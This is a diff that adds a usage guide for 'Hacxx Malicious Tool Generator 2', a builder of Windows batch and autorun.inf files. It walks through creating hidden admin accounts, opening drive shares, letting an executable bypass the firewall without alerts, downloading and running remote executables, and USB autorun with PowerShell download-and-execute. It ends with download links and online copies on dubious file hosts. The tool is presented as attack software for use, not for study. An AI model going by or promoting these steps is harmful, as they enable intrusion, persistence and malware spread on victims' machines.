@@ -1,0 +1,58 @@
+How to?
+0 - Open the html file, since all the codes require UAC, Select 0 and Generate
+- Complete with the name for the app
+
+1 - Select 1 and generate
+- Type username
+- Type password
+- The code will add admin with the choosen username and password
+
+2 - If you want to use shares. Select 2 and Generate.
+- Type the drive you want to open shares (Example: c)
+- To share more drives, leave 2 selected and hit Generate again
+- Type a letter (Example: d or e or f, etc...)
+
+3 - Close Shares
+- Select 2 and generate.
+- Will close all shares
+
+4 - If you want to allow a specific .exe to bypass windows firewall
+- Select 3 and Generate. Type Rule name and .exe location
+(This will remove any alerts that the .exe is trying to connect to the internet)
+- For multiple .exe files, just leave option 3 selected and hit Generate again.
+
+5 - If you want to download one .exe and execute on the machine...
+- Type remote location and local location.
+- (To download multiple files, leave 4 select and hit Generate again)
+
+Note: Hacxx Malicious Tool Generator append all the codes correctly.
+- You can create the same function with custom code unlimited. 
+- To finish, save the code as yourfile.bat
+
+6 - Autorun.inf for DVD/USB...
+- File that autostart with a external device
+- Type Executable location
+- Type a name for the device
+(This isn't a .bat. Dont use with the code above)
+
+7 - Autorun.inf + Powershell
+- File that autostart with a external device
+- If on windows, it will use Powershell to download and execute a file
+- Type remote location
+- Type local location
+- Type a name for the device
+(This isn't a .bat. Dont use with the code above)
+
+Download:
+https://oxy.st/d/Fkkh
+http://gigapeta.com/dl/10796466a38c6a2
+https://www.up-4ever.net/qvaxgqv2ybqq
+https://ddownload.com/vwyel8kzl5zy/Hacxx_Malicious_Tool_Generator_2.rar
+https://nitroflare.com/view/D0D7C3B941B0FC2/Hacxx_Malicious_Tool_Generator_2.rar
+
+Use the tool online:
+https://files.doxbin.gg/dJQA7dKu.html
+https://f.sed.lol/files/s4OTQ.html
+https://i.cutelolis.moe/Vqt3f1UqQu.html
+https://akari.genshin.su/JRziibwV.html
+https://i.adie.space/jeuzuc.html
